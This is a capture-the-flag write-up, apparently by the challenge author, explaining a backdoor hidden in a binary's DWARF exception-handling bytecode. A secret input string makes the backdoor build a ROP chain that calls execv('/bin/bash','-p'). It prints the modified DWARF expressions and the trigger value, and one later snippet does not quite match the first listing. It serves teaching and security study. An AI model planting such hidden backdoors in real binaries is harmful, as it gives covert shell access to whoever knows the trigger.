Big Jim's map
============

In this challenge, DWARF bytecode is used to write a backdoor that will be triggered when an exception occurs and only if the user entered the correct string.

DWARF bytecode is responsible for unwinding the stack after an excpetion occured. It is turing-complete and operates on the stack and is interpreted by libgcc.
Every binary that is compiled with gcc and that supports exception handling, comes with DWARF bytecode.

If you want to know more about it, check out the paper *Exploiting the hard-working DWARF: Trojan and Exploit Techniques With No Native Executable Code* by James Oakley and Sergey Bratus, you can find it [here](https://www.usenix.org/legacy/event/woot11/tech/final_files/Oakley.pdf).

## Write-up
Before I go into the details, let me explain how the backdoor code roughly works.

+ DWARF code resolves the address of **execv()** (Thanks to James and Sergey)
+ set up a ROP chain to pop RDI and RSI
+ if backdoor string is present place 'pop RDI' address
+ place address of **execv()** as the final return address
+ pivot RSP to point to the ROP chain
+ return to a **ret** instruction

Now let's go into the details.

With a simple diff of the two given binaries (server and server_mod) using hexdump, one can see that nothing has been changed inside the .code section. Instead the modification was mostly done inside .eh_frame.

In order to read the DWARF code in a more readable form, you can use a tool called [katana](http://katana.nongnu.org/) which allows you to extract, recompile and replace DWARF code in binaries. Use the katana shell and the following commands to extract the bytecode:
```bash
$e=load "server_mod"
dwarfscript emit $e "dwarf_code.dws"
```

Doing this with the unmodified version as well as with modified and then diffing the results will show pretty quickly what has changed. 
The most important part is this right here (slighty modified version for readablity):

```
...
DW_CFA_val_expression r7
begin EXPRESSION
        DW_OP_breg7 -648
end EXPRESSION
DW_CFA_val_expression r11
begin EXPRESSION
        DW_OP_breg7 0
        DW_OP_deref
        DW_OP_deref
        DW_OP_constu 0x2a303f26
        DW_OP_constu 0x20
        DW_OP_shl
        DW_OP_constu 0x575f5451
        DW_OP_plus
        DW_OP_xor
        DW_OP_bra WRONG
        DW_OP_constu 0x400e73
        DW_OP_skip EXIT
WRONG:
        DW_OP_constu 0x400a86
EXIT:
end EXPRESSION
DW_CFA_val_expression r12
begin EXPRESSION
        DW_OP_constu 0x6014c0
end EXPRESSION
DW_CFA_val_expression r13
begin EXPRESSION
        DW_OP_constu 0x400c2a
end EXPRESSION
DW_CFA_val_expression r14
begin EXPRESSION
        DW_OP_constu 0x6014ce
end EXPRESSION
DW_CFA_val_expression r15
begin EXPRESSION
...
a lot of stuff
...
end EXPRESSION
end INSTRUCTIONS
...
landing_pad: 0xa5
...
```

First you have to know that **DW_CFA_val_expression** will set the specified register to the result value of the followed expression. Later I will tell you why those registers have been chosen. But let me explain the other instructions real quick:

* **DW_OP_breg[X] &lt;offset&gt;** gives us the value of register X +/- the offset
* **DW_OP_deref** dereferences the address on top of the stack
* **DW_OP_constu &lt;value&gt;** pushes *value* on top of the stack
* **DW_OP_shl** shifts value y (second value from top of stack) to the left by x bits (first value from top of stack)
* **DW_OP_plus** adds the two top values from the stack
* **DW_OP_xor** xor's the two top values from the stack
* **DW_OP_bra &lt;label&gt;** jumps to label based on the value on top of the stack (0 or something else)

As mentioned before, all operations take place on the stack, so **DW_OP_plus** pops the top two values, adds them together and pushes the result back on top. In case of **DW_CFA_val_expression** whatever is left on top of the stack will be stored in the register.

Ok let's break it down:
```
DW_CFA_val_expression r7
begin EXPRESSION
    DW_OP_breg7 -648
end EXPRESSION
```
The above code, reads r7 substracts our offset and puts it back into r7. In DWARF code r7 is RSP, this places RSP to our ROP chain.

You may ask yourself why I need a ROP chain when I can modify registers, well I can only modify caller-saved registers, so RDI, RSI, RCX, RDX, etc can't be set with DWARF code.

The reason why I chose to use r11 to r15 is because those register allow me to place 6 consecutive values on the stack (our ROP chain). The interesting part here is r11. Because this is where our backdoor string is being checked.

```
DW_OP_breg7 0
DW_OP_deref
DW_OP_constu 0x4
DW_OP_plus
DW_OP_deref
```

The above code dereferences the value of RSP, adds 4 to the pointer and dereferences it again, which puts characters 5-13 that where sent to the service on top of the stack. For example, if you sent the service (instead of "GET filename") "GET AAAAAAAA ..." right after you connected, then the result of the derefs will be 0x4141414141414141, next we push the following value onto the stack 0x2a303f26575f5451. **DW_OP_constu** can't push 64 bit values that's why we need to use left shift and plus operation. In the end we XOR both values, the result will determine if we jump to WRONG or not.

```
0x4141414141414141 XOR 0x2a303f26575f5451
```

if the value is non zero we will jump to WRONG and the first return address in our ROP chain will be the original return address for a normal exception handling. If not (correct string) the first address in the ROP chain is the POP RDI gadget.

This means you can trigger the backdoor with 0x2a303f26575f5451 (mind the endians) as your input.

But before **execv()** can be executed, it first has to be resolved since the libc is still mapped to a random location. The code for that is in r15 and comes straight from James and Sergey which they published along with the paper (thank you :)). I modified it a little to resolve **execv()** instead of **execvpe()**.

The last modification that needs to be done is:

```
landing_pad: 0xa5
```

this is probably the most important one, because without it, we wouldn't execute our ROP chain properly. The value specified is an offset from the beginning of the function that contains the *catch()* for the thrown exception. Usually this would point right into the catch block, I modified it to point to a 'ret' instruction. Finally after replacing the DWARF code, I also placed the strings '/bin/bash' and '-p' to a static location inside the binary, so that the addresses can be popped into RDI
and RSI.

So that's pertty much it, I hope you enjoyed the challenge.
